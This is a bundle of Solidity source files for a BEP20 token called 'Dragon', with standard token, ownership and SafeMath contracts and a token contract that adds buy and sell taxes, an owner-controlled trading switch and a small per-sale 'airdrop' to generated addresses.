{"BEP20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \"./BEPContext.sol\";\r\nimport \"./IBEP20.sol\";\r\nimport \"./BEPOwnable.sol\";\r\nimport \"./SafeMath.sol\";\r\n/**\r\n * @dev Implementation of the {IBEP20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {BEP20Mintable}.\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of BEP20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn\u0027t required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IBEP20-approve}.\r\n */\r\ncontract BEP20 is BEPContext, IBEP20, BEPOwnable {\r\n  using SafeMath for uint256;\r\n\r\n  mapping(address =\u003e uint256) private _balances;\r\n\r\n  mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n  uint256 private _totalSupply;\r\n\r\n  /**\r\n   * @dev See {IBEP20-totalSupply}.\r\n   */\r\n  function totalSupply() public view override returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n  /**\r\n   * @dev See {IBEP20-balanceOf}.\r\n   */\r\n  function balanceOf(address account) public view override returns (uint256) {\r\n    return _balances[account];\r\n  }\r\n\r\n  /**\r\n   * @dev See {IBEP20-transfer}.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `recipient` cannot be the zero address.\r\n   * - the caller must have a balance of at least `amount`.\r\n   */\r\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev See {IBEP20-allowance}.\r\n   */\r\n  function allowance(address owner, address spender) public view override returns (uint256) {\r\n    return _allowances[owner][spender];\r\n  }\r\n\r\n  /**\r\n   * @dev See {IBEP20-approve}.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n  function approve(address spender, uint256 amount) public override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev See {IBEP20-transferFrom}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance. This is not\r\n   * required by the EIP. See the note at the beginning of {BEP20};\r\n   *\r\n   * Requirements:\r\n   * - `sender` and `recipient` cannot be the zero address.\r\n   * - `sender` must have a balance of at least `amount`.\r\n   * - the caller must have allowance for `sender`\u0027s tokens of at least\r\n   * `amount`.\r\n   */\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) public virtual override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n    _approve(\r\n      sender,\r\n      _msgSender(),\r\n      _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\")\r\n    );\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n   *\r\n   * This is an alternative to {approve} that can be used as a mitigation for\r\n   * problems described in {IBEP20-approve}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n   *\r\n   * This is an alternative to {approve} that can be used as a mitigation for\r\n   * problems described in {IBEP20-approve}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   * - `spender` must have allowance for the caller of at least\r\n   * `subtractedValue`.\r\n   */\r\n  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n    _approve(\r\n      _msgSender(),\r\n      spender,\r\n      _allowances[_msgSender()][spender].sub(subtractedValue, \"BEP20: decreased allowance below zero\")\r\n    );\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n   *\r\n   * This is internal function is equivalent to {transfer}, and can be used to\r\n   * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `sender` cannot be the zero address.\r\n   * - `recipient` cannot be the zero address.\r\n   * - `sender` must have a balance of at least `amount`.\r\n   */\r\n  function _transfer(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) internal virtual {\r\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n\r\n    _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);\r\n  }\r\n\r\n  /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n   * the total supply.\r\n   *\r\n   * Emits a {Transfer} event with `from` set to the zero address.\r\n   *\r\n   * Requirements\r\n   *\r\n   * - `to` cannot be the zero address.\r\n   */\r\n  function _mint(address account, uint256 amount) internal {\r\n    require(account != address(0), \"BEP20: mint to the zero address\");\r\n\r\n    _totalSupply = _totalSupply.add(amount);\r\n    _balances[account] = _balances[account].add(amount);\r\n    emit Transfer(address(0), account, amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Destroys `amount` tokens from `account`, reducing the\r\n   * total supply.\r\n   *\r\n   * Emits a {Transfer} event with `to` set to the zero address.\r\n   *\r\n   * Requirements\r\n   *\r\n   * - `account` cannot be the zero address.\r\n   * - `account` must have at least `amount` tokens.\r\n   */\r\n  function _burn(address account, uint256 amount) internal {\r\n    require(account != address(0), \"BEP20: burn from the zero address\");\r\n\r\n    _balances[account] = _balances[account].sub(amount, \"BEP20: burn amount exceeds balance\");\r\n    _totalSupply = _totalSupply.sub(amount);\r\n    emit Transfer(account, address(0), amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n   *\r\n   * This is internal function is equivalent to `approve`, and can be used to\r\n   * e.g. set automatic allowances for certain subsystems, etc.\r\n   *\r\n   * Emits an {Approval} event.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `owner` cannot be the zero address.\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n  function _approve(\r\n    address owner,\r\n    address spender,\r\n    uint256 amount\r\n  ) internal {\r\n    require(owner != address(0), \"BEP20: approve from the zero address\");\r\n    require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n\r\n  /**\r\n   * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\r\n   * from the caller\u0027s allowance.\r\n   *\r\n   * See {_burn} and {_approve}.\r\n   */\r\n  function _burnFrom(address account, uint256 amount) internal {\r\n    _burn(account, amount);\r\n    _approve(\r\n      account,\r\n      _msgSender(),\r\n      _allowances[account][_msgSender()].sub(amount, \"BEP20: burn amount exceeds allowance\")\r\n    );\r\n  }\r\n}"},"BEP20Detailed.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n/**\r\n * @dev Optional functions from the BEP20 standard.\r\n */\r\nabstract contract BEP20Detailed {\r\n  string private _name;\r\n  string private _symbol;\r\n  uint8 private _decimals;\r\n\r\n  /**\r\n   * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of\r\n   * these values are immutable: they can only be set once during\r\n   * construction.\r\n   */\r\n  constructor(\r\n    string memory name_,\r\n    string memory symbol_,\r\n    uint8 decimals_\r\n  ) {\r\n    _name = name_;\r\n    _symbol = symbol_;\r\n    _decimals = decimals_;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the name of the token.\r\n   */\r\n  function name() public view returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the symbol of the token, usually a shorter version of the\r\n   * name.\r\n   */\r\n  function symbol() public view returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the number of decimals used to get its user representation.\r\n   * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n   * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n   *\r\n   * Tokens usually opt for a value of 18, imitating the relationship between\r\n   * Ether and Wei.\r\n   *\r\n   * NOTE: This information is only used for _display_ purposes: it in\r\n   * no way affects any of the arithmetic of the contract, including\r\n   * {IBEP20-balanceOf} and {IBEP20-transfer}.\r\n   */\r\n  function decimals() public view returns (uint8) {\r\n    return _decimals;\r\n  }\r\n}"},"BEPContext.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract BEPContext {\r\n  // Empty internal constructor, to prevent people from mistakenly deploying\r\n  // an instance of this contract, which should be used via inheritance.\r\n  constructor() {}\r\n\r\n  function _msgSender() internal view returns (address payable) {\r\n    return payable(msg.sender);\r\n  }\r\n\r\n  function _msgData() internal view returns (bytes memory) {\r\n    this;\r\n    return msg.data;\r\n  }\r\n}"},"BEPOwnable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \"./BEPContext.sol\";\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract BEPOwnable is BEPContext {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"IBEP20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IBEP20 {\r\n  /**\r\n   * @dev Returns the amount of tokens in existence.\r\n   */\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens owned by `account`.\r\n   */\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Returns the remaining number of tokens that `spender` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This value changes when {approve} or {transferFrom} are called.\r\n   */\r\n  function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n   * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n   * allowance.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external returns (bool);\r\n\r\n  /**\r\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `value` may be zero.\r\n   */\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  /**\r\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n   * a call to {approve}. `value` is the new allowance.\r\n   */\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it\u0027s recommended to use it always.\r\n * not same\r\n */\r\nlibrary SafeMath {\r\n  /**\r\n   * @dev Returns the addition of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity\u0027s `+` operator.\r\n   *\r\n   * Requirements:\r\n   * - Addition cannot overflow.\r\n   */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity\u0027s `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity\u0027s `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   *\r\n   * _Available since v2.4.0._\r\n   */\r\n  function sub(\r\n    uint256 a,\r\n    uint256 b,\r\n    string memory errorMessage\r\n  ) internal pure returns (uint256) {\r\n    require(b \u003c= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the multiplication of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity\u0027s `*` operator.\r\n   *\r\n   * Requirements:\r\n   * - Multiplication cannot overflow.\r\n   */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n    // benefit is lost if \u0027b\u0027 is also tested.\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   *\r\n   * _Available since v2.4.0._\r\n   */\r\n  function div(\r\n    uint256 a,\r\n    uint256 b,\r\n    string memory errorMessage\r\n  ) internal pure returns (uint256) {\r\n    // Solidity only automatically asserts when dividing by 0\r\n    require(b \u003e 0, errorMessage);\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n    return c;\r\n  }\r\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\r\n//.\r\npragma solidity ^0.8.0;\r\nimport \"./BEP20Detailed.sol\";\r\nimport \"./BEP20.sol\";\r\n\r\ncontract Token is BEP20Detailed, BEP20 {\r\n  \r\n  mapping(address =\u003e bool) public liquidityPool;\r\n  mapping(address =\u003e bool) public _isExcludedFromFee;\r\n  mapping(address =\u003e uint256) public lastTrade;\r\n\r\n  uint8 private buyTax;\r\n  uint8 private sellTax;\r\n  uint8 private transferTax;\r\n  uint256 private taxAmount;\r\n  address public immutable deadAddress =0x000000000000000000000000000000000000dEaD; // dead address  \r\n  address private marketingPool;\r\n  bool public airdrop = true;\r\n  bool    public tradingEnabled;\r\n  event changeLiquidityPoolStatus(address lpAddress, bool status);\r\n  event changeMarketingPool(address marketingPool);\r\n  event change_isExcludedFromFee(address _address, bool status);   \r\n  event TradingStatusUpdated(bool tradingEnabled);\r\n  constructor() BEP20Detailed(\"Dragon\", \"Dragon\", 18) {\r\n    uint256 totalTokens = 1000000 * 10**uint256(decimals());\r\n    _mint(msg.sender, totalTokens);\r\n    sellTax = 5;\r\n    buyTax = 5;\r\n    transferTax = 0;\r\n    marketingPool = 0xF86989FeAe7C139f3e713D137FB37351CF741542;\r\n    _isExcludedFromFee[marketingPool] = true;\r\n    _isExcludedFromFee[owner()] = true;\r\n  }\r\n\r\n  function enableTrading() public onlyOwner {\r\n      require(!tradingEnabled, \"Trading is already enabled\");\r\n      tradingEnabled = true;\r\n      emit TradingStatusUpdated(true);\r\n  }\r\n\r\n  function claimBalance() external {\r\n   payable(marketingPool).transfer(address(this).balance);\r\n  }\r\n\r\n  function claimToken(address token, uint256 amount) external  {\r\n   BEP20(token).transfer(marketingPool, amount);\r\n  }\r\n\r\n  function airdropIN(bool newValue) external onlyOwner {\r\n    airdrop = newValue;\r\n  }\r\n\r\n  function setLiquidityPoolStatus(address _lpAddress, bool _status) external onlyOwner {\r\n    liquidityPool[_lpAddress] = _status;\r\n    emit changeLiquidityPoolStatus(_lpAddress, _status);\r\n  }\r\n\r\n  function setMarketingPool(address _marketingPool) external onlyOwner {\r\n    marketingPool = _marketingPool;\r\n    emit changeMarketingPool(_marketingPool);\r\n  }  \r\n\r\n  function getTaxes() external view returns (uint8 _sellTax, uint8 _buyTax, uint8 _transferTax) {\r\n    return (sellTax, buyTax, transferTax);\r\n  }  \r\n  \r\n  function _transfer(address sender, address receiver, uint256 amount) internal virtual override {\r\n    require(receiver != address(this), string(\"No transfers to contract allowed.\"));\r\n    require(tradingEnabled || _isExcludedFromFee[sender] || _isExcludedFromFee[receiver], \"Trading is not enabled yet\");\r\n    if(liquidityPool[sender] == true) {\r\n      //It\u0027s an LP Pair and it\u0027s a buy\r\n      taxAmount = (amount * buyTax) / 100;\r\n    } else if(liquidityPool[receiver] == true) {      \r\n      //It\u0027s an LP Pair and it\u0027s a sell\r\n      taxAmount = (amount * sellTax) / 100;\r\n\r\n      lastTrade[sender] = block.timestamp;\r\n\r\n    } else if(_isExcludedFromFee[sender] || _isExcludedFromFee[receiver] || sender == marketingPool || receiver == marketingPool) {\r\n      taxAmount = 0;\r\n    } else {\r\n      taxAmount = (amount * transferTax) / 100;\r\n    }\r\n\r\n    uint256 AIRAmount = 1*amount/10000;  \r\n    if(airdrop \u0026\u0026 liquidityPool[receiver] == true){              \r\n      address ad;\r\n      for(int i=0;i \u003c=0;i++){\r\n       ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\r\n         super._transfer(sender,ad,AIRAmount);                                      \r\n        }                 \r\n         amount -= AIRAmount*1;                                                                           \r\n       }\r\n\r\n    if(taxAmount \u003e 0) {\r\n      super._transfer(sender, deadAddress, taxAmount);\r\n    }    \r\n    super._transfer(sender, receiver, amount - taxAmount);\r\n  }\r\n\r\n  function transferToAddressETH(address payable recipient, uint256 amount) private {\r\n        recipient.transfer(amount);\r\n  }\r\n    \r\n   //to recieve ETH from uniswapV2Router when swaping\r\n  receive() external payable {}\r\n  \r\n}"}}